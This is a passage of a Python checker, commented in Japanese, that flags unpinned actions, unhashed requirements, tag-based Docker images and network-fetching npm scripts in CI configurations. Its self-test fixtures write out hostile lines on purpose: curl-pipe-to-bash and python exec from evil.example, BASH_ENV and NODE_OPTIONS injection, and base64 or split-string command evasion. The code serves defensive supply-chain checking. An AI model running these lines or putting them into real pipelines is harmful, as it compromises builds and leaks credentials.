            data = json.loads(pathlib.Path(path).read_text(encoding="utf-8"))
        except (OSError, ValueError) as e:
            bad.append(f"{path}: 読めない（{e}）")
            continue
        scripts = data.get("scripts") or {}
        if not isinstance(scripts, dict):
            bad.append(f"{path}: scripts が表でない")
            continue
        for name, cmd in sorted(scripts.items()):
            if FETCH.search(str(cmd)):
                bad.append(f"{path}: scripts.{name} が外から取る（作る job は網に出ない）: {cmd}")
    return bad


def form_report(kind, bad):
    for b in bad:
        print(f"FAIL {b}")
    print(f"RESULT: {'PASS' if not bad else 'FAIL'} deps-diff {kind} (外れ {len(bad)})")
    return 0 if not bad else 1


def form_selftest(tmp):
    """許す形の一覧の自己試験。抜け道の書き方ごとに 1 行の負例を作り、全部が落ちることを確かめる。"""
    sha, h = "0" * 40, "a" * 64
    good_wf = ("jobs:\n  a:\n    steps:\n      - uses: actions/checkout@" + sha + "  # v4\n"
               "      - uses: ./.github/actions/build\n      - name: x\n        run: |\n          echo 'uses: anything@v1'\n"
               "          grep -E '^[+-]uses:' f\n          npm ci --ignore-scripts\n"
               "          tok=$(curl -fsS -H \"Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}\" "
               "\"${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com\" | jq -r .value)\n"
               "      - uses: actions/upload-artifact@" + sha + "\n")
    uses_cases = [
        ("固定した uses の行と、run の中の文字が落ちる", good_wf, False, 0),
        ("版の札で落ちない", "      - uses: actions/checkout@v4\n", False, 1),
        ("流れの書き方で落ちない", "      - {uses: actions/checkout@v4}\n", False, 1),
        ("引用した鍵で落ちない", '      - "uses": actions/checkout@v4\n', False, 1),
        ("一重の引用の鍵で落ちない", "      - 'uses': actions/checkout@v4\n", False, 1),
        ("折り返しで落ちない", "      - uses: >-\n          actions/checkout@v4\n", False, 1),
        ("符号の鍵で落ちない", '      - "u\\x73es": actions/checkout@v4\n', False, 1),
        ("別名で落ちない", "      - uses: *pinned\n", False, 1),
        ("鍵の後の空白で落ちない", "      - uses : actions/checkout@" + sha + "\n", False, 1),
        ("大文字の鍵で落ちない", "      - USES: actions/checkout@v4\n", False, 1),
        ("組み立ての型の中の版の札で落ちない", "runs:\n  using: composite\n  steps:\n    - uses: actions/attest@v2\n", True, 1),
        ("組み立ての型の中の ./ で落ちない", "runs:\n  using: composite\n  steps:\n    - uses: ./inner\n", True, 1),
        ("組み立ての型の中の固定した SHA が落ちる", "name: a\ndescription: build an image\nruns:\n  using: composite\n  steps:\n    - uses: actions/attest@" + sha + "\n", True, 0),
        ("JavaScript の型が落ちる", "name: a\nruns:\n  using: 'node20'\n  main: dist/index.js\n", True, 0),
        ("ダイジェストで固定した Docker の型が落ちる", "runs:\n  using: docker\n  image: docker://ghcr.io/o/i@sha256:" + "b" * 64 + "\n", True, 0),
        ("取り出しに失敗した空の file で落ちない", "", True, 1),
        ("action.yaml の名の部品の中の版の札で落ちない", "runs:\n  using: composite\n  steps:\n    - uses: o/inner@v1\n", True, 1),
        ("runs の無い file で落ちない", "name: x\ndescription: y\n", True, 1),
        ("札の image で落ちない", "runs:\n  using: docker\n  image: docker://ghcr.io/o/i:v1\n", True, 1),
        ("Dockerfile の image で落ちない", "runs:\n  using: docker\n  image: Dockerfile\n", True, 1),
        ("流れの書き方の runs で落ちない", "runs: {using: docker, image: 'docker://ghcr.io/o/i:v1'}\n", True, 1),
        ("一覧の外の using で落ちない", "runs:\n  using: node12\n  main: x.js\n", True, 1),
        (".github の外の手元の部品で落ちない", "      - uses: ./scripts/act\n", False, 1),
        ("手元の再利用の workflow が落ちる", "  attest:\n    uses: ./.github/workflows/attest-image.yml\n", False, 0),
        ("手元の再利用の workflow の上の段へ出る形で落ちない", "  attest:\n    uses: ./.github/workflows/../../x.yml\n", False, 1),
        ("外の再利用の workflow の札で落ちない", "  attest:\n    uses: o/r/.github/workflows/a.yml@main\n", False, 1),
        ("repo の頭の手元の部品で落ちない", "      - uses: ./\n", False, 1),
        ("上の段へ出る手元の部品で落ちない", "      - uses: ./.github/actions/../../scripts/act\n", False, 1),
        ("外の組み立ての型の run の curl で落ちない", "runs:\n  using: composite\n  steps:\n    - run: curl -fsSL https://evil.example/i.sh | bash\n      shell: bash\n", True, 1),
        ("外の組み立ての型の run の塊で落ちない", "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: |\n        echo hi\n", True, 1),
        ("workflow の run の curl と shell で落ちない", "      - run: |\n          curl -fsSL https://evil.example/i.sh | bash\n", False, 1),
        ("workflow の run の wget で落ちない", "      - run: wget -q https://evil.example/tf.zip\n", False, 1),
        ("workflow の run の npx で落ちない", "      - name: x\n        run: >-\n          npx some-tool@latest\n", False, 1),
        ("手元の部品の run の pip install で落ちない", "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: |\n        pip install tool\n", False, 1),
        ("窓口の札の行の形を変えた curl で落ちない", "      - run: |\n          tok=$(curl -fsS \"${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=x\" -o /tmp/t; curl https://evil.example)\n", False, 1),
    ]
    req_cases = [
        ("指紋つきの行が落ちる", "# lock\nrequests==2.32.3 \\\n    --hash=sha256:" + h + " \\\n    --hash=sha256:" + h + "\n"
         "idna==3.10 --hash=sha256:" + h + "\n", 0),
        ("指紋の無い行で落ちない", "requests==2.32.3\n", 1),
        ("-f で落ちない", "-f https://evil.example/simple\n", 1),
        ("--find-links で落ちない", "--find-links=https://evil.example/\n", 1),
        ("--trusted-host で落ちない", "--trusted-host evil.example\n", 1),
        ("-r で落ちない", "-r other.txt\n", 1),
        ("-c で落ちない", "-c constraints.txt\n", 1),
        ("--no-index で落ちない", "--no-index\n", 1),
        ("名前 @ URL で落ちない", "requests @ https://evil.example/requests.whl --hash=sha256:" + h + "\n", 1),
        ("-e で落ちない", "-e git+https://evil.example/r.git\n", 1),
        ("--index-url で落ちない", "--index-url https://evil.example/simple\n", 1),
        ("字下げした取り込み元で落ちない", "requests==2.32.3 \\\n    --index-url https://evil.example/\n", 1),
        ("版の幅で落ちない", "requests>=2.0 --hash=sha256:" + h + "\n", 1),
    ]
    d64 = "c" * 64
    cred = "jobs:\n  deploy:\n    runs-on: ubuntu-24.04\n    permissions:\n      id-token: write\n    steps:\n"
    plain = "jobs:\n  build:\n    runs-on: ubuntu-24.04\n    steps:\n"
    # 第 15 回: 作る場所の形（像の札、手元の docker の部品、資格を借りる job の run が呼ぶ file、Dockerfile の FROM、npm の scripts）。
    place_cases = [
        ("資格を借りる job の container の札で落ちない", "wf.yml", cred.replace("    steps:", "    container:\n      image: hashicorp/terraform:1.9\n    steps:") + "      - run: terraform plan\n", 1),
        ("資格を借りる job の container のダイジェストで落ちない（置かせない）", "wf.yml", cred.replace("    steps:", "    container:\n      image: hashicorp/terraform@sha256:" + d64 + "\n    steps:") + "      - run: echo x\n", 1),
        ("資格を借りる job の services の :latest で落ちない", "wf.yml", cred.replace("    steps:", "    services:\n      h:\n        image: ghcr.io/x/h:latest\n    steps:") + "      - run: echo x\n", 1),
        ("workflow の頭の id-token と job の container で落ちない", "wf.yml", "permissions:\n  id-token: write\n" + plain.replace("    steps:", "    container: node:22\n    steps:") + "      - run: echo x\n", 1),
        ("作る job の container の札で落ちない", "wf.yml", plain.replace("    steps:", "    container: node:22\n    steps:") + "      - run: echo x\n", 1),
        ("作る job の流れの書き方の container で落ちない", "wf.yml", plain.replace("    steps:", "    container: {image: 'node:22'}\n    steps:") + "      - run: echo x\n", 1),
        ("作る job の services のダイジェストが落ちる", "wf.yml", plain.replace("    steps:", "    services:\n      pg:\n        image: postgres@sha256:" + d64 + "\n    steps:") + "      - run: echo x\n", 0),
        ("資格を借りる job の run の bash scripts/ で落ちない", "wf.yml", cred + "      - run: bash scripts/install-tool.sh\n", 1),
        ("資格を借りる job の run の ./scripts/ で落ちない", "wf.yml", cred + "      - run: |\n          ./scripts/setup.sh\n", 1),
        ("資格を借りる job の run の make で落ちない", "wf.yml", cred + "      - run: make tools\n", 1),
        ("資格を借りる job の run の npm run で落ちない", "wf.yml", cred + "      - run: npm run build\n", 1),
        ("資格を借りる job の run の source で落ちない", "wf.yml", cred + "      - run: |\n          set -eu; . scripts/env.sh\n", 1),
        ("資格を借りる job の run の python3 -c で落ちない", "wf.yml", cred + "      - run: python3 -c 'import urllib.request'\n", 1),
        ("資格を借りる job の docker build で落ちない", "wf.yml", cred + "      - run: docker build --network=none --pull=false -t x -f db/Dockerfile db\n", 1),
        ("資格を借りる job の tools/ci の file が落ちる", "wf.yml", cred + "      - run: |\n          bash tools/ci/fetch-terraform.sh \"${RUNNER_TEMP}/bin\"\n", 0),
        ("作る job の run の docker build（札の土台）で落ちない", "wf.yml", plain + "      - run: docker build -t x .\n", 1),
        ("作る job の run の buildx で落ちない", "wf.yml", plain + "      - run: docker buildx build --pull -t x .\n", 1),
        ("作る job の run の docker pull の札で落ちない", "wf.yml", plain + "      - run: docker pull postgres:17-alpine\n", 1),
        ("作る job の網の無い docker build とダイジェストの pull が落ちる", "wf.yml", plain + "      - run: |\n          docker pull postgres@sha256:" + d64 + "\n"
         "          docker build --network=none --pull=false -t \"$IMAGE\" -f db/Dockerfile db\n", 0),
        ("手元の docker の部品の札の image で落ちない", "action.yml", "runs:\n  using: docker\n  image: docker://hashicorp/terraform:1.9\n", 1),
        ("手元の docker の部品の image: Dockerfile で落ちない", "action.yaml", "runs:\n  using: docker\n  image: Dockerfile\n", 1),
        ("手元の docker の部品のダイジェストが落ちる", "action.yml", "runs:\n  using: docker\n  image: docker://ghcr.io/o/i@sha256:" + d64 + "\n", 0),
        ("手元の組み立ての部品の run の scripts/ で落ちない", "action.yml", "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: bash ./scripts/setup.sh\n", 1),
    ]
    # 第 16 回: 資格を借りる job の見分けを許す形で読む。run は許す行の一覧だけ。shell は bash だけ。docker の語はどの位置でも拾う。
    fetch_line = ('          gh api -H "Accept: application/vnd.github.raw" "repos/${GITHUB_REPOSITORY}/contents/tools/ci/cred-steps.sh?ref=${GITHUB_SHA}"'
                  ' > "${RUNNER_TEMP}/cred-steps.sh"\n')
    flow = "jobs:\n  deploy:\n    runs-on: ubuntu-24.04\n    permissions: {contents: read, id-token: write}\n    steps:\n"
    quoted = "jobs:\n  deploy:\n    runs-on: ubuntu-24.04\n    permissions:\n      \"id-token\": write\n    steps:\n"
    r16_cases = [
        ("流れの書き方の permissions の job の bash scripts/ で落ちない", "wf.yml", flow + "      - run: bash scripts/install-tool.sh\n", 1),
        ("引用した鍵の id-token の job の make で落ちない", "wf.yml", quoted + "      - run: make tools\n", 1),
        ("流れの書き方の permissions だけでも落ちない", "wf.yml", flow.replace("id-token: write", "id-token: none") + "      - run: echo x\n", 1),
        ("permissions の別名で落ちない", "wf.yml", plain.replace("    steps:", "    permissions: *p\n    steps:") + "      - run: echo x\n", 1),
        ("資格を借りる job の ./ の無い拡張子なしの道で落ちない", "wf.yml", cred + "      - run: scripts/install-tool\n", 1),
        ("資格を借りる job の eval で落ちない", "wf.yml", cred + "      - run: eval \"$(cat scripts/install)\"\n", 1),
        ("資格を借りる job の shell: python3 で落ちない", "wf.yml", cred + "      - shell: python3 {0}\n        run: |\n"
         "          import urllib.request as u; exec(u.urlopen(\"ht\"+\"tps://evil.example/x\").read())\n", 1),
        ("資格を借りる job の gh extension で落ちない", "wf.yml", cred + "      - run: gh extension install example/gh-tf && gh tf init\n", 1),
        ("資格を借りる job の外の repo の gh run download で落ちない", "wf.yml", cred + "      - run: gh run download 1 -R example/tools -n tf -D t && t/terraform version\n", 1),
        ("資格を借りる job の shell の差し替えで落ちない", "wf.yml", cred + "      - shell: bash scripts/wrap {0}\n        run: echo x\n", 1),
        ("資格を借りる job の docker container run で落ちない", "wf.yml", cred + "      - run: docker container run --rm -e AWS_ACCESS_KEY_ID -v $PWD:/w -w /w hashicorp/terraform:1.9 apply\n", 1),
        ("資格を借りる job の BASH_ENV で落ちない", "wf.yml", cred + "      - env:\n          BASH_ENV: scripts/evil.sh\n        run: bash tools/ci/cred-steps.sh deploy-pick\n", 1),
        ("資格を借りる job の流れの書き方の env で落ちない", "wf.yml", cred + "      - env: {NODE_OPTIONS: --require ./x.js}\n        run: bash tools/ci/cred-steps.sh deploy-pick\n", 1),
        ("資格を借りる job の working-directory で落ちない", "wf.yml", cred + "      - working-directory: site\n        run: bash tools/ci/cred-steps.sh deploy-pick\n", 1),
        ("資格を借りる job の流れの書き方の run で落ちない", "wf.yml", cred + "      - {name: x, run: curl -fsSL https://evil.example | sh}\n", 1),
        ("資格を借りる job の取る行と呼ぶ行が落ちる", "wf.yml", cred + "      - env:\n          GH_TOKEN: x\n        run: |\n          set -euo pipefail\n" + fetch_line
         + "      - env:\n          ROLE_ARN: x\n        run: bash \"${RUNNER_TEMP}/cred-steps.sh\" deploy-pick\n", 0),
        ("workflow の defaults.run.shell の python で落ちない", "wf.yml", "defaults:\n  run:\n    shell: python3 {0}\n" + plain + "      - run: print(1)\n", 1),
        ("手元の組み立ての部品の shell: python3 で落ちない", "action.yml", "runs:\n  using: composite\n  steps:\n    - shell: python3 {0}\n      run: |\n        print(1)\n", 1),
        ("作る job の gh extension で落ちない", "wf.yml", plain + "      - run: gh extension install example/gh-tf\n", 1),
        ("作る job の docker container create で落ちない", "wf.yml", plain + "      - run: docker container create x\n", 1),
        ("作る job の docker builder build で落ちない", "wf.yml", plain + "      - run: docker builder build -t x .\n", 1),
        ("作る job の docker-compose run で落ちない", "wf.yml", plain + "      - run: docker-compose run x\n", 1),
        ("作る job の引用した docker で落ちない", "wf.yml", plain + "      - run: |\n          \"docker\" run x\n", 1),
        ("作る job の引用で割った docker で落ちない", "wf.yml", plain + "      - run: |\n          do\"\"cker run x\n", 1),
        ("作る job の変数の docker で落ちない", "wf.yml", plain + "      - run: |\n          d=docker; $d run x\n", 1),
        ("作る job の eval と base64 で落ちない", "wf.yml", plain + "      - run: |\n          $(echo ZG9ja2VyIHJ1bg== | base64 -d) x\n", 1),
        ("作る job の Containerfile の docker build で落ちない", "wf.yml", plain + "      - run: docker build --network=none --pull=false -f api/Containerfile api\n", 1),
        ("作る job の -f - の docker build で落ちない", "wf.yml", plain + "      - run: docker build --network=none --pull=false -f - api\n", 1),
        ("作る job の docker save と使い捨ての容器の作りが落ちる", "wf.yml", plain + "      - run: |\n          docker save db-migrate -o \"${RUNNER_TEMP}/db-images/db-migrate.tar\"\n"
         "          docker run --rm --network=none --user \"$(id -u):$(id -g)\" -v \"${RUNNER_TEMP}/build-src:/w\" -w /w node@sha256:" + d64 + " npm run build\n", 0),
        ("使い捨ての容器の札の像で落ちない", "wf.yml", plain + "      - run: docker run --rm --network=none --user \"$(id -u):$(id -g)\" -v \"${RUNNER_TEMP}/build-src:/w\" -w /w node:22 npm run build\n", 1),
    ]
    docker_cases = [
        ("FROM のダイジェストと前の段の名前が落ちる", "FROM node@sha256:" + d64 + " AS build\nRUN echo x\nFROM build\nCOPY a /a\n", 0),
        ("FROM の札で落ちない", "FROM postgres:17-alpine\n", 1),
        ("FROM の :latest で落ちない", "FROM hashicorp/terraform:latest\n", 1),
        ("FROM の変数で落ちない", "ARG BASE=postgres@sha256:" + d64 + "\nFROM ${BASE}\n", 1),
        ("折り返した FROM の札で落ちない", "FROM \\\n  postgres:17\n", 1),
        ("ADD の URL で落ちない", "FROM a@sha256:" + d64 + "\nADD https://evil.example/x.tgz /x\n", 1),
        ("RUN --network で落ちない", "FROM a@sha256:" + d64 + "\nRUN --network=host curl https://evil.example\n", 1),
        ("前の段からの COPY --from と RUN --mount が落ちる", "FROM a@sha256:" + d64 + " AS tools\nFROM b@sha256:" + d64 + "\nCOPY --from=tools /t /t\n"
         "RUN --mount=type=bind,from=tools,target=/h true\nCOPY --from=c@sha256:" + d64 + " /x /x\n", 0),
        ("# syntax= の指示で落ちない", "# syntax=docker/dockerfile:1\nFROM a@sha256:" + d64 + "\n", 1),
        ("# escape= の指示で落ちない", "# escape=`\nFROM a@sha256:" + d64 + "\n", 1),
        ("COPY --from の札の像で落ちない", "FROM a@sha256:" + d64 + "\nCOPY --from=ghcr.io/example/tools:latest /t /t\n", 1),
        ("RUN --mount の from= の札の像で落ちない", "FROM a@sha256:" + d64 + "\nRUN --mount=type=bind,from=example/helper:1,target=/h sh /h/x\n", 1),
    ]
    script_cases = [
        ("取り出しの無い scripts が落ちる", {"scripts": {"build": "vite build", "test": "vitest run"}}, 0),
        ("prebuild の npx で落ちない", {"scripts": {"prebuild": "npx --yes font-fetcher@latest", "build": "vite build"}}, 1),
        ("build の curl で落ちない", {"scripts": {"build": "curl -fsSL https://evil.example/x | sh && vite build"}}, 1),
        ("npm exec で落ちない", {"scripts": {"postbuild": "npm exec -- some-tool"}}, 1),
    ]
    good, n = True, 0
    for name, fname, text, want in place_cases + r16_cases:
        d = tmp / f"place{n}"
        n += 1
        d.mkdir()
        f = d / fname
        f.write_text(text, encoding="utf-8")
        got = check_uses([str(f)])
        if (len(got) > 0) != (want > 0):
            good = False
            print(f"FAIL selftest deps-diff --uses（作る場所）: {name}: {got}")
    for name, text, want in docker_cases:
        f = tmp / f"Dockerfile{n}"
        n += 1
        f.write_text(text, encoding="utf-8")
        got = check_dockerfile([str(f)])
        if (len(got) > 0) != (want > 0):
            good = False
            print(f"FAIL selftest deps-diff --dockerfile: {name}: {got}")
    for name, data, want in script_cases:
        f = tmp / f"package{n}.json"
        n += 1
        f.write_text(json.dumps(data), encoding="utf-8")
        got = check_scripts([str(f)])
        if (len(got) > 0) != (want > 0):
            good = False
            print(f"FAIL selftest deps-diff --scripts: {name}: {got}")
    for name, text, remote, want in uses_cases:
        f = tmp / f"wf{n}.yml"
        n += 1
        f.write_text(text, encoding="utf-8")
        got = check_uses([str(f)], remote=remote)
        if (len(got) > 0) != (want > 0):
            good = False
            print(f"FAIL selftest deps-diff --uses: {name}: {got}")
    for name, text, want in req_cases:
        f = tmp / f"req{n}.txt"
        n += 1
        f.write_text(text, encoding="utf-8")
        got = check_requirements([str(f)])
        if (len(got) > 0) != (want > 0):
            good = False
            print(f"FAIL selftest deps-diff --requirements: {name}: {got}")
    return good, len(uses_cases) + len(req_cases) + len(place_cases) + len(r16_cases) + len(docker_cases) + len(script_cases)


def main(argv):
    if argv[:1] == ["--selftest"]:
        return selftest()
    if argv[:1] in (["--uses"], ["--uses-remote"]):
        return form_report(argv[0], check_uses(argv[1:], remote=argv[0] == "--uses-remote"))
    if argv[:1] == ["--requirements"]:
        return form_report("--requirements", check_requirements(argv[1:]))
    if argv[:1] == ["--dockerfile"]:
        return form_report("--dockerfile", check_dockerfile(argv[1:]))
    if argv[:1] == ["--scripts"]:
        return form_report("--scripts", check_scripts(argv[1:]))
    args = [a for a in argv if a != "--github"]
    if len(args) != 2:
        print(__doc__)
        return 2
    return report(args[0], args[1], github="--github" in argv)


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
